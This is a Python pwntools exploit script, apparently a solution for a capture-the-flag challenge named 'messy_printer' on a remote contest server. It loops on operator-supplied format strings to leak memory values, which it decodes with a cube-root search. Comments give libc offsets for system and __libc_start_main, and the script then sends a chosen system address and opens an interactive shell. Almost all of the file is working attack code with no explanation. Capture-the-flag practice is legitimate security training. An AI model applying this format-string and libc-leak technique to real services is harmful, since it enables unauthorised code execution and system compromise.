from pwn import *
import math

#system 55410
#__libc_start_main 26fc0 +243

def find(low,upper,k):
    while low <= upper:
        mid = low + int((upper - low) / 2)
        if mid**3 < k:
            low = mid + 1
        elif mid**3 > k:
            upper = mid - 1
        else:
            return mid
    return -1

#server = process('./messy_printer')
server = remote('eofqual.zoolab.org', 4001)

server.recvuntil('Continue? [y/n]:')
server.send('y')
for i in range(1000):
    server.recvuntil('Give me title:')
    server.sendline(b'\x01')
    str1 = server.recvuntil('Give me content:', drop=True)[2:-1]
    n = int(str1.hex(),16) + 1
    format = input()[:-1]
    server.sendline(format)
    str2 = server.recvuntil('Continue? [y/n]:', drop=True)[2:-1]
    k = n - int(str2.hex(),16) 
    leak = find(int(math.pow(k,1/3-1e-5)),int(math.pow(k,1/3+1e-5)),k)
    arr = []
    while leak > 0:
        arr.append(leak%256)
        leak = int(leak // 256)
    arr.reverse()
    print(bytes(arr).decode())
    if format == 'ok':
        server.send('n')
        server.recvuntil('Give me the magic:')
        break
    else:
        server.send('y')
print('system address:',end=' ')
server.sendline(p64(int(input())))
server.interactive()